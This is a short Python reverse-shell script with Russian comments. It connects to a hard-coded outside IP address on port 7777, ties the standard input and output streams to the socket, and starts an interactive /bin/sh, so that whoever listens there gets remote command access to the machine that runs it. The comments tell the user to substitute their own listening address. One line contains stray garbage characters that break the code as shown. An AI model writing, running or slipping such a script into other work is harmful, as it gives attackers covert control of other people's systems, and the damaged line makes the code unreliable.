import socket
import subprocess
import os

# Укажите ваш IP-адрес и порт, на которые сервер будет подключаться
IP = "95.165.8.178"  # Замените на ваш IP-адрес
PORT = 7777       # Замените на порт, который вы прослушиваете

def reverse_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))   ojkjlljklkljk
    os.dup2(s.fileno(), 0)  # Перенаправление stdin
    os.dup2(s.fileno(), 1)  # Перенаправление stdout
    os.dup2(s.fileno(), 2)  # Перенаправление stderr
    p = subprocess.call(["/bin/sh", "-i"])

# Запуск функции
reverse_shell(IP, PORT)
